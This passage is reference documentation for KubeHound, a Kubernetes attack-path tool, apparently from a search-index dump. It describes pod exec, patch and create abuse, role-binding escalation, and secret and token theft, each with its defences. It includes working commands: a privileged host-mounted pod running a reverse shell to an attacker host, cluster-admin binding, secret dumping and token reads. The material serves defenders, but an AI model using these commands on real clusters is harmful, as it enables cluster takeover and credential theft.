io.containerd.runc.v2\nf681a2a6f64b11bf53ec8d1c13de0d8715ac30819f21f94f316e0bc26a844770    registry.k8s.io/pause:3.7                        io.containerd.runc.v2\n</code></pre> <p>and the running tasks:</p> <pre><code>$ ctr -n k8s.io tasks ls\nTASK                                                                PID       STATUS\n839a74e97f50a275d306252842f3e79fca684a3b8b5ed3175d154fb990c80f31    51064     RUNNING\nae35055acaccc10634d9160f08937d71d856be6b0d954cc772e72c83ee9bffee    351       RUNNING\nd2ff37e3f64e4032c34f635aa5d494e3d52e481772e2e8a71c5677f58938c35d    511       RUNNING\n2446353ed4380ef6e81172b5c09a9191e9e300c93ded0febea42967177aae3d1    909       RUNNING\n5bebdfa7f163311e44997625d4c1ac958f46ff1398925e9dbc7fb8a2ac2fc25a    12955     RUNNING\n026430a39a6452201524dfbe9872b2eb6027a9bcc2085fa8f7d95096150165c0    50523     RUNNING\n332f857ec069937342b07ed526e1d714b552e4656ed3e7c938b2b69c3790eb18    50895     RUNNING\n24ab75252feedcf5232af1fa02a215bb0851599bc762933f7b7442943fcd58f9    50940     RUNNING\n48e7c28fdc68c9473a31dea3194b922e064ad9e37499da7b7cf2481722d97dc6    401       RUNNING\n80eeba17282348b418d786c6fa76338df7a7f6a6734767492825c1d6674a376a    50854     RUNNING\n61250b69765dbf0fadb9cdcfa87db7c0b8c4c85ff93051f83e52574a3b4b7bd4    12922     RUNNING\nef5d38bf4bf263cbb80f0ea8cb75059e2fc997b9885d649afe0cc7d48e4f8b3f    357       RUNNING\n0f36d12d60d12d041df894132882380a1175d462b654d62cc2907994cbf6c238    233924    RUNNING\nba0483c7235ccdbc9baf9f2ac0e39bea1cf54c3a16cab068c0c51954bbde99d1    233893    RUNNING\nf4efb164afc51bf45cb09ed99058e72ea2e70cf887b8f8cfd5a058e69e65aa2e    1741      RUNNING\n</code></pre>"},{"location":"reference/attacks/POD_ATTACH/#exploitation","title":"Exploitation","text":"<p>We have full control of all the running containers. The simplest way to make us of this is to execute a new task inside one of the running containers to get a shell:</p> <pre><code>ctr -n k8s.io task exec -t --exec-id full-control 0f36d12d60d12d041df8941\n</code></pre>"},{"location":"reference/attacks/POD_ATTACH/#defences","title":"Defences","text":""},{"location":"reference/attacks/POD_ATTACH/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for use of the CTR binary (or equivalents such as crictl or nerdctl) within nodes via the Datadog agent. This activity should be very unusual.</li> </ul>"},{"location":"reference/attacks/POD_ATTACH/#calculation","title":"Calculation","text":"<ul> <li>PodAttach</li> </ul>"},{"location":"reference/attacks/POD_ATTACH/#references","title":"References:","text":"<ul> <li>Kubernetes API Reference Docs</li> <li>https://iximiuz.com/en/posts/containerd-command-line-clients/</li> <li>https://nanikgolang.netlify.app/post/containers/</li> <li>https://www.mankier.com/8/ctr</li> </ul>"},{"location":"reference/attacks/POD_CREATE/","title":"POD_CREATE","text":""},{"location":"reference/attacks/POD_CREATE/#pod_create","title":"POD_CREATE","text":"<p>Create a pod with significant privilege (<code>CAP_SYSADMIN</code>, <code>hostPath=/</code>, etc) and schedule on a target node via setting the <code>nodeName</code> selector.</p> Source Destination MITRE ATT&amp;CK PermissionSet Node Deploy Container, T1610"},{"location":"reference/attacks/POD_CREATE/#details","title":"Details","text":"<p>Given the rights to create a new pod, an attacker can create a deliberately overprivileged pod within the cluster. This will grant the attacker full control over the node on which the pod is scheduled (via any number of container escape techniques). Additionally by setting the <code>nodeName</code> selector in the pod spec to the control plane node, the attacker can gain root access to the control plane node and take over the entire cluster!</p>"},{"location":"reference/attacks/POD_CREATE/#prerequisites","title":"Prerequisites","text":"<p>A role granting permission to create pods.</p>"},{"location":"reference/attacks/POD_CREATE/#checks","title":"Checks","text":"<p>Check whether the current account has the ability to create pods, for example using kubectl:</p> <pre><code>kubectl auth can-i create pod\n</code></pre>"},{"location":"reference/attacks/POD_CREATE/#exploitation","title":"Exploitation","text":"<p>Identify the name of the target (e.g control plane) node via:</p> <pre><code>kubectl get nodes -o wide --all-namespaces | grep control-plane\n</code></pre> <p>Create a pod spec for our attack pod (N.B. If your target node is a control plane one you may need to add a toleration to this manifest to allow it to be scheduled):</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: control-plane-attack\n  labels:\n    app: pentest\nspec:\n  hostNetwork: true\n  hostPID: true\n  hostIPC: true\n  containers:\n  - name: control-plane-attack\n    image: ubuntu\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /host\n      name: noderoot\n    command: [ \"/bin/sh\", \"-c\", \"--\" ]\n    args: [ \"bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;attacker_port&gt; 0&gt;&amp;1\" ]\n  nodeName: &lt; TARGET NODE NAME &gt; \n  volumes:\n  - name: noderoot\n    hostPath:\n      path: /\n</code></pre> <p>Create the pod via kubectl:</p> <pre><code>kubebctl apply -f control-plane-pod-spec.yaml\n</code></pre>"},{"location":"reference/attacks/POD_CREATE/#defences","title":"Defences","text":""},{"location":"reference/attacks/POD_CREATE/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for pod creation from within an existing pod </li> <li>Monitor privileged pod creation with suspicious command arguments</li> </ul>"},{"location":"reference/attacks/POD_CREATE/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with additional powerful capabilities.</p>"},{"location":"reference/attacks/POD_CREATE/#calculation","title":"Calculation","text":"<ul> <li>PodCreate</li> </ul>"},{"location":"reference/attacks/POD_CREATE/#references","title":"References:","text":"<ul> <li>The Path Less Traveled: Abusing Kubernetes Defaults (Video)</li> <li>The Path Less Traveled: Abusing Kubernetes Defaults (GitHub)</li> <li>Bad Pods</li> </ul>"},{"location":"reference/attacks/POD_EXEC/","title":"POD_EXEC","text":""},{"location":"reference/attacks/POD_EXEC/#pod_exec","title":"POD_EXEC","text":"<p>With the correct privileges an attacker can use the Kubernetes API to obtain a shell on a running pod.</p> Source Destination MITRE ATT&amp;CK PermissionSet Pod Container Administration Command, T1609"},{"location":"reference/attacks/POD_EXEC/#details","title":"Details","text":"<p>An attacker with sufficient permissions can execute arbitrary commands inside the container using the <code>kubectl exec</code> command.</p>"},{"location":"reference/attacks/POD_EXEC/#prerequisites","title":"Prerequisites","text":"<p>Ability to interrogate the K8s API with a role allowing exec access to pods which have the binary you want to execute (e.g. <code>/bin/bash</code>) available.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/POD_EXEC/#checks","title":"Checks","text":"<p>Simply ask kubectl:</p> <pre><code>kubectl auth can-i create pod/exec\n</code></pre>"},{"location":"reference/attacks/POD_EXEC/#exploitation","title":"Exploitation","text":"<p>Spawn a new interactive shell on the target pod:</p> <pre><code>kubectl exec  --stdin --tty &lt;POD NAME&gt; -- /bin/bash\n</code></pre>"},{"location":"reference/attacks/POD_EXEC/#defences","title":"Defences","text":""},{"location":"reference/attacks/POD_EXEC/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for pod exec from within an existing pod </li> <li>This activity will be BAU for SREs and as such monitoring for follow on actions may be more fruitful</li> </ul>"},{"location":"reference/attacks/POD_EXEC/#implement-least-privilege-access","title":"Implement least privilege access","text":"<p>Pod interactive execution is a very powerful privilege and should not be required by the majority of users. Use an automated tool such a KubeHound to search for any risky permissions and users in the cluster and look to eliminate them.</p>"},{"location":"reference/attacks/POD_EXEC/#calculation","title":"Calculation","text":"<ul> <li>PodExec</li> <li>PodExecNamespace</li> </ul>"},{"location":"reference/attacks/POD_EXEC/#references","title":"References:","text":"<ul> <li>Official Kubernetes Documentation</li> </ul>"},{"location":"reference/attacks/POD_PATCH/","title":"POD_PATCH","text":""},{"location":"reference/attacks/POD_PATCH/#pod_patch","title":"POD_PATCH","text":"<p>With the correct privileges an attacker can use the Kubernetes API to modify certain properties of an existing pod and achieve code execution within the pod</p> Source Destination MITRE ATT&amp;CK PermissionSet Pod Container Administration Command, T1609"},{"location":"reference/attacks/POD_PATCH/#details","title":"Details","text":"<p>The <code>kubectl patch</code> command enables updating specific fields of a resource, including pods. However, the fields that can be updated using a <code>PATCH</code> command depend on the resource's API schema and the specific Kubernetes version in use. In the current version (1.27) only a very restricted set of fields can be modified using this command: + <code>spec.containers[*].image</code> + <code>spec.initContainers[*].image</code> + <code>spec.activeDeadlineSeconds</code> + <code>spec.tolerations</code> (only additions to existing tolerations) + <code>spec.terminationGracePeriodSeconds</code> (allow it to be set to 1 if it was previously negative)</p> <p>However, this is still just enough to allow an attacker to achieve execution in a pod by modifying the container image of a running pod to a backdoored container image in an accessible container registry.</p>"},{"location":"reference/attacks/POD_PATCH/#prerequisites","title":"Prerequisites","text":"<p>Ability to interrogate the K8s API with a role allowing pod patch access.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/POD_PATCH/#checks","title":"Checks","text":"<p>Simply ask kubectl:</p> <pre><code>k auth can-i patch pod\n</code></pre>"},{"location":"reference/attacks/POD_PATCH/#exploitation","title":"Exploitation","text":"<p>First, create a backdoored container image and save in an accessible container registry. For demonstration purposes we will use <code>kalilinux/kali-last-release</code> in dockerhub. Next create a patch file, changing the target pod image to our backdoored image:</p> <pre><code>spec:\n  containers:\n  - name: &lt;TARGET POD NAME&gt;\n    image: kalilinux/kali-last-release\n</code></pre> <p>Finally apply the patch via <code>kubectl</code>:</p> <pre><code>kubectl patch pod &lt;TARGET POD NAME&gt; --patch-file patch.yaml\n</code></pre> <p>If trusted container registries are enforced, a different approach is required. There are two options: + Introduce an attacker-controlled container into the trusted registry (mechanisms for this are out of scope). This approach may or may not be possible depending on the level of access, but is the simplest option if an attacker already has appropriate access. + Find an image in the trusted registry with a known vulnerability that can be exploited to achieve RCE.</p>"},{"location":"reference/attacks/POD_PATCH/#defences","title":"Defences","text":""},{"location":"reference/attacks/POD_PATCH/#enforce-usage-of-trusted-container-registries","title":"Enforce Usage of Trusted Container Registries","text":"<p>Prevent pods pulling images from non-trusted container registries. Since the <code>pod/patch</code> access is limited to modifying the container image, blocking access to untrusted registries makes this attack significantly harder to achieve (requires introducing a malicious image into a trusted regsitry).</p>"},{"location":"reference/attacks/POD_PATCH/#implement-least-privilege-access","title":"Implement least privilege access","text":"<p>Pod patch is a very powerful privilege and should not be required by the majority of users. Use an automated tool such a KubeHound to search for any risky permissions and users in the cluster and look to eliminate them.</p>"},{"location":"reference/attacks/POD_PATCH/#calculation","title":"Calculation","text":"<ul> <li>PodPatch</li> <li>PodPatchNamespace</li> </ul>"},{"location":"reference/attacks/POD_PATCH/#references","title":"References:","text":"<ul> <li>Official Kubernetes Documentation</li> </ul>"},{"location":"reference/attacks/ROLE_BIND/","title":"ROLE_BIND","text":""},{"location":"reference/attacks/ROLE_BIND/#role_bind","title":"ROLE_BIND","text":"<p>A role that grants permission to create or modify <code>(Cluster)RoleBindings</code> can allow an attacker to escalate privileges on a compromised user.</p> Source Destination MITRE ATT&amp;CK PermissionSet PermissionSet Valid Accounts, T1078 <p>Warning</p> <p>This attack has LIMITATIONS in the current implementation. Consult the RBAC section for more details.</p>"},{"location":"reference/attacks/ROLE_BIND/#details","title":"Details","text":""},{"location":"reference/attacks/ROLE_BIND/#tldr","title":"TL;DR","text":"<p>An attacker with sufficient permission can create a <code>RoleBinding</code> with the default existing admin <code>ClusterRole</code> and bind it to a compromised user. By creating this <code>RoleBinding</code>, the compromised user becomes highly privileged, and can execute privileged operations in the cluster (reading secrets, creating pods, etc.).</p> <p>To exploit the attack we need to:</p> <ul> <li>Be able to <code>create</code> (verb) a <code>clusterolebinding</code> or <code>rolebinding</code> (resource).</li> <li>Be able to <code>bind</code> (verb) a <code>clusterrole</code> or a <code>role</code> (resource).</li> </ul>"},{"location":"reference/attacks/ROLE_BIND/#rbac","title":"RBAC","text":"<p>To fully understand the attacks we need to know the basic around RBAC in kubernetes:</p> <ul> <li>Roles and role bindings must exist in the same namespace.</li> <li>Role bindings can exist in separate namespaces to service accounts.</li> <li>Role bindings can link cluster roles, but they only grant access to the namespace of the role binding.</li> <li>Cluster role bindings link accounts to cluster roles and grant access across all resources.</li> <li>Cluster role bindings can not reference roles.</li> </ul> <p>In KubeHound we added an abstraction called PermissionSet which is an object that link the RoleBinding and the Role directly (in one object). When creating every PermissionSet all the above rules are enforced to make sure the scope is valid.</p> <p>In the bind attack there is 2 levels to checks:</p> <ul> <li>The PermissionSet itself (rolebinding/role) which will grant the role to designated subject </li> <li>The actual verbs allowed by the PermissionSet. We are looking for the verbs <code>create</code> and <code>bind</code>.</li> </ul> <p>To test all usecases, we created unit tests for each:</p> <ul> <li>CRB_CR: regroup all the PermissionSets with ClusterRoleBinding / ClusterRole.</li> <li>RB_CR-SA: regroup all the PermissionSets with RoleBinding/ClusterRole for a Service Account.</li> <li>RB_R-SA: regroup all the PermissionSets with RoleBinding/Role for a ServiceAccount.</li> <li>RB_R-UG: regroup all the PermissionSets with RoleBinding/Role for Users/Groups.</li> </ul> <p> Summarizing RBAC attacks using the bind verb </p> <p>But, the PermissionSet object is created only if a role is linked by a rolebinding, this imply:</p> <ul> <li>If a role is not linked by a role binding, no PermissionSet will be created in the graph. Therefore this role can not be used in any attack paths (there is no direct role abstraction)</li> <li>All the PermissionSet are created from at the ingestion time. Currently no attacks create new assets in the graph. It means only the \"existing\" PermissionSet can be used in the attack path generation.</li> </ul> <p>So some of the usecases are not fully covered:</p> Usecase # Coverage Limitation description 1 Full N/A 2 Limited All the PermissionSet that are not namespaced are linked to a single specific namespace. Yet, this attack allow to bind a role to any namespace. Therefore, we would need to create additional PermissionSet for every namespace if we want to fully cover the attack 3 Full N/A 4 None To cover this usecase, we need duplicate a non-namespaced PermissionSet to a namespace one."},{"location":"reference/attacks/ROLE_BIND/#limitation-of-the-can-i-kubernetes-api","title":"Limitation of the can-i Kubernetes API","text":"<p>The PermissionSet (linked by RoleBinding/Role) allows access to namespaced objects only. So even if the verb allows you to <code>create</code> a <code>ClusterRoleBinding</code> and <code>bind</code> a <code>ClusterRole</code>, it will not work because those objects are not namespaced. With this PermissionSet (RB/R), the scope is only namespaced objects. </p> <p>K8s API will let you create invalid configs, it is considered as \"a feature of Kubernetes RBAC\". For instance you can create RBAC that will give you rights to allow the educate right on dolphin objects. So Kubernetes won't warn you if you get something wrong, because it doesn\u2019t have a list of what \u201cright\u201d looks like. So when asking the <code>can-i</code> API from Kubernetes, it will tell you that you can <code>create</code> a <code>ClusterRoleBinding</code> and <code>bind</code> a <code>ClusterRole</code> because it will only process a \"regex check\".</p> <p>Asking the API if I can create/bind:</p> <pre><code>root@rolebind-pod-rb-r-crb-cr-fail:/# ./kubectl auth can-i create clusterrolebindin\nWarning: resource 'clusterrolebindings' is not namespace scoped in group 'rbac.authorization.k8s.io'\n\nyes\nroot@rolebind-pod-rb-r-crb-cr-fail:/# ./kubectl auth can-i bind clusterrole\nWarning: resource 'clusterroles' is not namespace scoped in group 'rbac.authorization.k8s.io'\n\nyes\n</code></pre> <p>Exploiting the attack fails (as expected):</p> <pre><code>root@rolebind-pod-rb-r-crb-cr-fail:/# ./kubectl create clusterrolebinding rolebindadmin --clusterrole=cluster-admin --serviceaccount=default:rolebind-sa-rb-r-crb-cr-fail\nerror: failed to create clusterrolebinding: clusterrolebindings.rbac.authorization.k8s.io is forbidden: User \"system:serviceaccount:default:rolebind-sa-rb-r-crb-cr-fail\" cannot create resource \"clusterrolebindings\" in API group \"rbac.authorization.k8s.io\" at the cluster scope\nroot@rolebind-pod-rb-r-crb-cr-fail:/# ./kubectl create clusterrolebinding rolebindadmin --clusterrole=cluster-admin --serviceaccount=default:rolebind-sa-rb-r-crb-cr-fail -n default\nerror: failed to create clusterrolebinding: clusterrolebindings.rbac.authorization.k8s.io is forbidden: User \"system:serviceaccount:default:rolebind-sa-rb-r-crb-cr-fail\" cannot create resource \"clusterrolebindings\" in API group \"rbac.authorization.k8s.io\" at the cluster scope\n</code></pre>"},{"location":"reference/attacks/ROLE_BIND/#tests-usergroup-rbac-in-kind-cluster","title":"Tests User/Group RBAC in kind cluster","text":"<p>Users and groups have been created in the Kind Cluster. Each user have it is own kubeconfig file. They are located in the <code>test/setup/test-cluster/RBAC</code> folder:</p> <ul> <li>KUBECONFIG=test/setup/test-cluster/RBAC/user-rb-r-crb-cr-fail/kubeconfig kubectl auth can-i bind clusterrole</li> </ul>"},{"location":"reference/attacks/ROLE_BIND/#prerequisites","title":"Prerequisites","text":"<p>Ability to interact with the K8s API with a role allowing modify or create access to <code>(Cluster)RoleBindings</code>. Pods config for all the use cases:</p> <ul> <li>ROLE_BIND_CRB_CR: ClusterRoleBinding / ClusterRole </li> <li>ROLE_BIND_RB_CR-SA: RoleBinding / ClusterRole for ServiceAccounts</li> <li>ROLE_BIND_RB_R-SA: RoleBinding / Role for ServiceAccounts</li> <li>ROLE_BIND_RB_R-UG: RoleBinding / Role for Users/Groups</li> </ul> <p>The following file regroups some assets needed to exploit/test the attacks ROLE_BIND_ALL:</p> <ul> <li><code>Admin</code> Role not bind to any account in the default namespace. This can be bind using <code>./kubectl create rolebinding rbr-admin --role=admin --serviceaccount=$SAS -n default</code> for instance.</li> <li>Instance (in vault namespace) into reach from the role bind exploitation: <code>./kubectl get pods -n vault</code></li> </ul>"},{"location":"reference/attacks/ROLE_BIND/#checks","title":"Checks","text":"<p>Installing required binary (jq / curl / kubectl) <pre><code>ARCH=$(arch | sed s/aarch64/arm64/ | sed s/x86_64/amd64/)\napt update &amp;&amp; apt install -y curl jq &amp;&amp; curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/arm64/kubectl\" &amp;&amp; chmod +x kubectl\n</code></pre></p> <p>Simply ask kubectl: <pre><code>./kubectl auth can-i create clusterrolebinding\n./kubectl auth can-i create rolebinding\n./kubectl auth can-i bind role\n./kubectl auth can-i bind clusterrole\n</code></pre></p> <p>Note: in one edge case (describe earlier), using <code>can-i</code> Kubernetes API is not enough.</p>"},{"location":"reference/attacks/ROLE_BIND/#exploitation","title":"Exploitation","text":"<p>Create the <code>(Cluster)RoleBinding</code> definition as below:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: evil-rolebind\n  namespace: default\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n  - kind: ServiceAccount\n    name: &lt;compromised user&gt;\n    namespace: default\n</code></pre> <p>Create the binding via kubectl:</p> <pre><code>kubebctl apply -f evil-rolebind-spec.yaml\n</code></pre> <p>Retrieving service account information (needed to bind the role):</p> <pre><code>JWT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nSAS=$(jq -R 'split(\".\") | .[1] | @base64d | fromjson' &lt;&lt;&lt; \"$JWT\" | jq -r '.\"kubernetes.io\"|.namespace,.serviceaccount.name' | paste -s -d \":\")\n</code></pre> <p>Exploiting the attack using only the kubectl command:</p> <pre><code>./kubectl create rolebinding rbr-admin --role=admin --serviceaccount=$SAS -n default\n./kubectl create rolebinding r-cr-admin --clusterrole=cluster-admin --serviceaccount=$SAS -n default\n./kubectl create clusterrolebinding cr-cr-admin --clusterrole=cluster-admin --serviceaccount=$SAS\n</code></pre> <p>Note: the <code>admin</code> is not a standard role, it has been added manually in the kind cluster.</p>"},{"location":"reference/attacks/ROLE_BIND/#defences","title":"Defences","text":""},{"location":"reference/attacks/ROLE_BIND/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor anomalous access to the K8s authorization API including creating privileged <code>(Cluster)RoleBinding</code> from with a pod, unusual <code>User-Agent</code> headers and other outliers.</li> </ul>"},{"location":"reference/attacks/ROLE_BIND/#implement-least-privilege-access","title":"Implement least privilege access","text":"<p>Creating <code>(Cluster)RoleBinding</code> is a very powerful privilege and should not be required by the majority of users. Use an automated tool such a KubeHound to search for any risky permissions and users in the cluster and look to eliminate them.</p>"},{"location":"reference/attacks/ROLE_BIND/#calculation","title":"Calculation","text":"<ul> <li>RoleBind - UseCase 1</li> <li>RoleBind - UseCase 2</li> <li>RoleBind - UseCase 3</li> <li>RoleBind - UseCase 4 - not implemented yet</li> </ul>"},{"location":"reference/attacks/ROLE_BIND/#references","title":"References:","text":"<ul> <li>Official Kubernetes Documentation:Using RBAC Authorization</li> <li>Securing Kubernetes Clusters by Eliminating Risky Permissions</li> <li>Getting into a bind with Kubernetes</li> <li>Official Kubernetes Documentation: Bind verb</li> <li>Official Kubernetes Documentation: RBAC rules</li> <li>Mixing Kubernetes Roles, RoleBindings, ClusterRoles, and ClusterBindings</li> <li>RBAC Virtual Verbs: Teaching Kubernetes to Educate Dolphins</li> </ul>"},{"location":"reference/attacks/SHARE_PS_NAMESPACE/","title":"SHARE_PS_NAMESPACE","text":""},{"location":"reference/attacks/SHARE_PS_NAMESPACE/#share_ps_namespace","title":"SHARE_PS_NAMESPACE","text":"Source Destination MITRE ATT&amp;CK Container Container Taint Shared Content, T1080 <p>Represents a relationship between containers within the same pod that share a process namespace. </p>"},{"location":"reference/attacks/SHARE_PS_NAMESPACE/#details","title":"Details","text":"<p>Pods represent one or more containers with shared storage and network resources. Optionally, containers within the same pod can elect to share a process namespace with a flag in the pod spec.</p>"},{"location":"reference/attacks/SHARE_PS_NAMESPACE/#prerequisites","title":"Prerequisites","text":"<p>Access to a container within a pod running other containers with shared process namespaces</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/SHARE_PS_NAMESPACE/#checks","title":"Checks","text":"<p>Consider the following spec, with two containers sharing a process namespace:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  shareProcessNamespace: true\n  containers:\n  - name: nginx\n    image: nginx\n  - name: shell\n    image: busybox:1.28\n    securityContext:\n      capabilities:\n        add:\n        - SYS_PTRACE\n    stdin: true\n    tty: true\n</code></pre> <p>From within the shell container, simply run:</p> <pre><code>ps ax\n</code></pre> <p>Without namespace sharing, no outside processes would be visible. However, with this specification we would expect an output similar to the below where the nginx processes from the other container are visible:</p> <pre><code>PID   USER     TIME  COMMAND\n    1 root      0:00 /pause\n    8 root      0:00 nginx: master process nginx -g daemon off;\n   14 101       0:00 nginx: worker process\n   15 root      0:00 sh\n   21 root      0:00 ps ax\n</code></pre>"},{"location":"reference/attacks/SHARE_PS_NAMESPACE/#exploitation","title":"Exploitation","text":"<p>Various options are possible here based on the attacker end goal. Ultimately it is possible to gain full control of other containers within the shared namespace. The easiest vector is to directly access the filesystem of the other container using the <code>/proc/$pid/root</code> link. Sticking with the previous example, running the below should display the contents of the nginx config file:</p> <pre><code># run this inside the \"shell\" container\n# change \"8\" to the PID of the Nginx process, if necessary\nhead /proc/8/root/etc/nginx/nginx.conf\n</code></pre>"},{"location":"reference/attacks/SHARE_PS_NAMESPACE/#defences","title":"Defences","text":""},{"location":"reference/attacks/SHARE_PS_NAMESPACE/#defence-in-depth","title":"Defence in depth","text":"<p>Prevent the use of shared namespaces in pods, where containers have different risk profiles. Ideally these types of containers should be run within separate pods.</p>"},{"location":"reference/attacks/SHARE_PS_NAMESPACE/#calculation","title":"Calculation","text":"<ul> <li>SharedPsNamespace</li> </ul>"},{"location":"reference/attacks/SHARE_PS_NAMESPACE/#references","title":"References:","text":"<ul> <li>Kubernetes API Reference Docs</li> </ul>"},{"location":"reference/attacks/TOKEN_BRUTEFORCE/","title":"TOKEN_BRUTEFORCE","text":""},{"location":"reference/attacks/TOKEN_BRUTEFORCE/#token_bruteforce","title":"TOKEN_BRUTEFORCE","text":"Source Destination MITRE ATT&amp;CK PermissionSet Identity Steal Application Access Token, T1528 <p>An identity with a role that allows get on secrets (vs list) can potentially view all the serviceaccount tokens in a specific namespace or in the whole cluster (with ClusterRole).</p>"},{"location":"reference/attacks/TOKEN_BRUTEFORCE/#details","title":"Details","text":"<p>An attacker in possession of a token with permission to read a secret cannot use this permission without knowing the secret\u2019s full name. This permission is different from the list secrets permission described in TOKEN_LIST. However it may be possible to extract secrets via bruteforce for all K8s serviceaccounts due to their predictable naming convention.</p>"},{"location":"reference/attacks/TOKEN_BRUTEFORCE/#prerequisites","title":"Prerequisites","text":"<p>Ability to interrogate the K8s API with a role allowing get access to secrets.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/TOKEN_BRUTEFORCE/#checks","title":"Checks","text":"<p>Simply ask kubectl:</p> <pre><code>kubectl auth can-i get secrets\n</code></pre>"},{"location":"reference/attacks/TOKEN_BRUTEFORCE/#exploitation","title":"Exploitation","text":"<p>Exploitation of this vulnerability can be complex and time-consuming. See the original research for a detailed description for the steps required.</p>"},{"location":"reference/attacks/TOKEN_BRUTEFORCE/#defences","title":"Defences","text":""},{"location":"reference/attacks/TOKEN_BRUTEFORCE/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor anomalous access to the secrets API including listing all secrets, unusual User-Agent headers and other outliers.</li> <li>Alert on anomalous volume of requests to the secrets API in a short time period.</li> </ul>"},{"location":"reference/attacks/TOKEN_BRUTEFORCE/#implement-least-privilege-access","title":"Implement least privilege access","text":"<p>Even get on secrets is a very powerful privilege and should not be required by the majority of users. Use an automated tool such a KubeHound to search for any risky permissions and users in the cluster and look to eliminate them.</p>"},{"location":"reference/attacks/TOKEN_BRUTEFORCE/#calculation","title":"Calculation","text":"<ul> <li>TokenBruteforce</li> <li>TokenBruteforceNamespace</li> </ul>"},{"location":"reference/attacks/TOKEN_BRUTEFORCE/#references","title":"References:","text":"<ul> <li>Official Kubernetes documentation: Secrets</li> <li>Securing Kubernetes Clusters by Eliminating Risky Permissions</li> </ul>"},{"location":"reference/attacks/TOKEN_LIST/","title":"TOKEN_LIST","text":""},{"location":"reference/attacks/TOKEN_LIST/#token_list","title":"TOKEN_LIST","text":"Source Destination MITRE ATT&amp;CK PermissionSet Identity Steal Application Access Token, T1528 <p>An identity with a role that allows listing secrets can potentially view all the secrets in a specific namespace or in the whole cluster (with ClusterRole).</p>"},{"location":"reference/attacks/TOKEN_LIST/#details","title":"Details","text":"<p>Obtaining the list secrets permission will be a significant advantage to an attacker. It may lead to disclosure of application credentials, SSH keys, other more privileged user\u2019s tokens and more.  All of these can be used in different ways depending on their capabilities. For our graph model we focus on the latter case of extracting K8s tokens only.</p>"},{"location":"reference/attacks/TOKEN_LIST/#prerequisites","title":"Prerequisites","text":"<p>Ability to interrogate the K8s API with a role allowing list access to secrets.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/TOKEN_LIST/#checks","title":"Checks","text":"<p>Simply ask kubectl:</p> <pre><code>kubectl auth can-i list secrets\n</code></pre>"},{"location":"reference/attacks/TOKEN_LIST/#exploitation","title":"Exploitation","text":"<p>Simply dump all secrets using kubectl:</p> <pre><code>kubectl get secrets -o json | jq\n</code></pre>"},{"location":"reference/attacks/TOKEN_LIST/#defences","title":"Defences","text":""},{"location":"reference/attacks/TOKEN_LIST/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor anomalous access to the secrets API including listing all secrets, unusual User-Agent headers and other outliers.</li> </ul>"},{"location":"reference/attacks/TOKEN_LIST/#implement-least-privilege-access","title":"Implement least privilege access","text":"<p>Listing secrets is a very powerful privilege and should not be required by the majority of users. Use an automated tool such as KubeHound to search for any risky permissions and users in the cluster and look to eliminate them.</p>"},{"location":"reference/attacks/TOKEN_LIST/#calculation","title":"Calculation","text":"<ul> <li>TokenList</li> <li>TokenListNamespace</li> </ul>"},{"location":"reference/attacks/TOKEN_LIST/#references","title":"References:","text":"<ul> <li>Official Kubernetes documentation: Secrets</li> <li>Securing Kubernetes Clusters by Eliminating Risky Permissions</li> <li>Official Kubernetes documentation: List Secret Risks</li> </ul>"},{"location":"reference/attacks/TOKEN_STEAL/","title":"TOKEN_STEAL","text":""},{"location":"reference/attacks/TOKEN_STEAL/#token_steal","title":"TOKEN_STEAL","text":"Source Destination MITRE ATT&amp;CK Volume Identity Unsecured Credentials, T1552 <p>This attack represents the ability to steal a K8s API token from an accessible volume.</p>"},{"location":"reference/attacks/TOKEN_STEAL/#details","title":"Details","text":"<p>An attacker with access to a pod with an automounted serviceaccount token (the default behaviour) can steal the serviceaccount access token to perform actions in the K8s API. More significantly if an attacker is able to access all or part of the K8s node filesystem e.g via a <code>hostPath</code> mount, an attacker could retrieve the service account tokens for ALL pods running on the node. This attack is possible from access to a container or node and each case is discussed separately throughout.</p>"},{"location":"reference/attacks/TOKEN_STEAL/#prerequisites","title":"Prerequisites","text":""},{"location":"reference/attacks/TOKEN_STEAL/#container","title":"Container","text":"<ul> <li>A service account token mounted into the container via a projected volume (default behaviour).</li> </ul>"},{"location":"reference/attacks/TOKEN_STEAL/#node","title":"Node","text":"<ul> <li>Access to a K8s node filesystem (<code>/var/lib/kubelet/pods</code> or any parent directory)</li> </ul>"},{"location":"reference/attacks/TOKEN_STEAL/#checks","title":"Checks","text":""},{"location":"reference/attacks/TOKEN_STEAL/#container_1","title":"Container","text":"<p>Check whether a serviceaccount token is automounted:</p> <pre><code>ls -la /var/run/secrets/kubernetes.io/\nls -la /run/secrets/kubernetes.io/\n</code></pre> <p>Check whether a host volume mount provides access to other pods' tokens:</p> <pre><code>ls -la /&lt;HOST MOUNT&gt;/var/lib/kubelet/pods/\n</code></pre> <p>KDigger can also help with this.</p>"},{"location":"reference/attacks/TOKEN_STEAL/#node_1","title":"Node","text":"<p>Confirm access to the location of pod tokens:</p> <pre><code>ls -la /var/lib/kubelet/pods/\n</code></pre>"},{"location":"reference/attacks/TOKEN_STEAL/#exploitation","title":"Exploitation","text":"<p>See IDENTITY_ASSUME for how to use a captured token.</p>"},{"location":"reference/attacks/TOKEN_STEAL/#container_2","title":"Container","text":"<p>From within a container read the service account token mounted in the default location:</p> <pre><code>cat /run/secrets/kubernetes.io/serviceaccount/token\ncat 